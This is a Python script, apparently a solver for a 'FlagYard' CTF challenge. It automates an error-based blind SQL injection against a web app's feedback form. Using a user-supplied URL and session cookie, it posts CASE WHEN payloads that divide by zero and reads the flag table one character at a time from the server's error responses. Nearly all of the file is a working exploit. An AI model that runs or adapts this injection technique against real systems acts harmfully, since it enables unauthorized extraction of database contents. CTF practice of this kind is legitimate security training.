import requests
import re
import itertools
import time
import sys
import threading


print('''
               #########               
            ###############            
         #####################         
      ###########################      
   ##############     ##############   
 #############           ############# 
###########                 ###########
########                       ########
#######                         #######
#######                         #######
#######                         #######
#######                         #######
#######                         #######
#######                         #######
#######                         #######
########                       ########
###########                 ###########
 #############           ############# 
   ##############     ##############   
      ###########################      
         #####################         
            ###############            
               #########               

Welcome To FlagYard Feedback CTF Tool    
''')

print("Please enter the URL:")
url = input("# ")
host = re.sub(r'http://|/$', '', url)
print("=> URL : ", url)
print("[+] Please Enter Your Cookie Session")
token = input("# ")
print("=> Session : ", token)
print("[+] Do you want to see the program trying to display flag? (y/n) ")
debug = input("# ")
while debug not in ["y", "n"]:
    print("[+] Please enter 'y' or 'n'")
    debug = input("# ")
def loading_animation():
    spinner = itertools.cycle(['-', '/', '|', '\\'])
    while getattr(threading.current_thread(), "do_run", True):
        sys.stdout.write(f'\rNow we are getting the flag, please wait {next(spinner)}')
        sys.stdout.flush()
        time.sleep(0.1)

if debug == "n":
    loading_thread = threading.Thread(target=loading_animation)
    loading_thread.start()


def dosqli(url,data):
    headers = {
    "Host": host,
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.97 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Connection": "close",
    "Cookie": f"session={token}"}
    response = requests.post(url, headers=headers, data=data)
    if("Something went wrong" in response.text):
        return("Wrong")
    else:
        return("Correct")


flag = []
for i in range(1, 65):
    for j in range(32, 126):
        payload = f"ana'||(select CASE WHEN substr((select flag from flag),{str(i)},1)='{chr(j)}' THEN 1 ELSE 1/0 END)||'s"
        data = {"feedback": payload}
        out = dosqli(url, data)
        if out == "Correct":
            flag.append(chr(j))
            sys.stdout.write(chr(j))
            sys.stdout.flush()
            break

if debug == "n":
    loading_thread.do_run = False
    loading_thread.join()

print(f"\nFinal flag: {flag}")
print("Done")
